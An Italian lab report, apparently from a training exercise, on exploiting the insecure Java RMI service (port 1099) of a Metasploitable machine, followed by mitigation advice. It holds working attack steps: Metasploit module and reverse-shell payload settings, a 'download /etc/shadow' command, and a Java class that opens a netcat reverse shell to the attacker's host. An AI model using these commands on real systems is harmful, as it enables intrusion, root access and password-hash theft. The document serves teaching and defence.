# Report Tecnico: Sfruttamento della Vulnerabilità Java RMI (Porta 1099)

## 1. Introduzione e Analisi della Vulnerabilità

Il servizio **Java Remote Method Invocation (RMI)** sulla porta 1099 di Metasploitable è vulnerabile a causa di una configurazione insicura che permette il caricamento di oggetti da sorgenti remote (**Remote Codebase Loading**). Questa falla consente a un attaccante di far eseguire al server codice arbitrario (Remote Code Execution - RCE).

---

## 2. Fase A: Sfruttamento tramite Metasploit (Automated)

L'utilizzo del framework Metasploit permette un'esecuzione rapida e l'ottenimento di una sessione Meterpreter avanzata.

### Passaggi eseguiti:

1. **Verifica:** Scansione con Nmap per confermare lo stato della porta: `nmap -p 1099 <IP_VITTTIMA>`
    
2. **Selezione Modulo:** `use exploit/multi/misc/java_rmi_server`
    
3. **Configurazione:**
    
    - `set RHOSTS <IP_VITTTIMA>`
        
    - `set LHOST <IP_KALI>`
        
    - `set PAYLOAD java/meterpreter/reverse_tcp`
        
4. **Esecuzione:** `exploit`
    
5. **Raccolta Evidenze (Post-Exploitation):**
    
    - `ipconfig` (Configurazione di rete)
        
    - `route` (Tabella di routing)
        
    - `download /etc/shadow` (Esfiltrazione hash password)
        

---

## 3. Fase B: Sfruttamento Manuale (Step-by-Step)

L'obiettivo manuale è replicare il comportamento di Metasploit senza l'uso del framework, interagendo direttamente con il registro RMI.

### Passaggi logici:

1. **Enumerazione:** Identificazione degli oggetti RMI registrati tramite script NSE: `nmap -sV --script rmi-dumpregistry -p 1099 <IP_VITTTIMA>`
    
2. **Creazione del Payload (`Exploit.java`):** Si scrive una classe Java che apre una connessione di rete verso l'attaccante.
    
    
    
    ```Java
    public class Exploit {
        public Exploit() {
            try {
                Runtime.getRuntime().exec("nc -e /bin/sh <IP_KALI> 4444");
            } catch (Exception e) {}
        }
    }
    ```
    
3. **Compilazione ed Hosting:**
    
    - Compilazione: `javac Exploit.java`
        
    - Avvio server web: `python3 -m http.server 8080` (per permettere alla vittima di scaricare il file `.class`).
        
4. **Trigger dell'Attacco:** Utilizzo di un tool (come _RMIScout_ o un client Java personalizzato) per chiamare il registro RMI della vittima, passando come parametro l'indirizzo del nostro server web: `http://<IP_KALI>:8080/`.
    
5. **Ricezione Shell:** In ascolto sulla macchina Kali: `nc -lvnp 4444`.
    

---

## 4. Fase C: Mitigazione e Messa in Sicurezza

Per prevenire questo tipo di attacchi su un sistema reale, è necessario intervenire su più livelli:

### 1. Configurazione Java (Rimedio primario)

La difesa più efficace consiste nel disabilitare il caricamento di codebase remote. È necessario impostare le seguenti proprietà di sistema all'avvio dell'applicazione Java:

- `java.rmi.server.useCodebaseOnly=true`: Impedisce al registro di scaricare classi da URL forniti dai client.
    
- `java.rmi.server.hostname`: Assicurarsi che il servizio sia in ascolto solo su interfacce sicure o localhost se non deve essere esposto.
    

### 2. Autenticazione e SSL/TLS

RMI non fornisce autenticazione di default. È fondamentale:

- Implementare l'uso di **SSL/TLS** per cifrare la comunicazione.
    
- Aggiungere filtri di serializzazione (introdotti nelle versioni recenti di Java) per bloccare oggetti non attendibili.
    

### 3. Sicurezza a livello di Rete (Firewalling)

- **Segmentazione:** La porta 1099 non dovrebbe mai essere esposta su reti pubbliche.
    
- **ACL:** Configurare il firewall per permettere connessioni alla porta RMI solo da indirizzi IP fidati (es. server di monitoraggio o nodi applicativi autorizzati).
    

### 4. Aggiornamento del Software

Molti degli exploit RMI sfruttano librerie obsolete presenti nel _classpath_. Mantenere aggiornato il JRE (Java Runtime Environment) e le librerie applicative riduce drasticamente i vettori di attacco basati sulla deserializzazione.

---

### Conclusione

L'exploit su Metasploitable dimostra come una singola proprietà di configurazione (`useCodebaseOnly=false`) possa trasformare un servizio di gestione remota in una porta d'ingresso per un attaccante, garantendo privilegi di livello **root**.
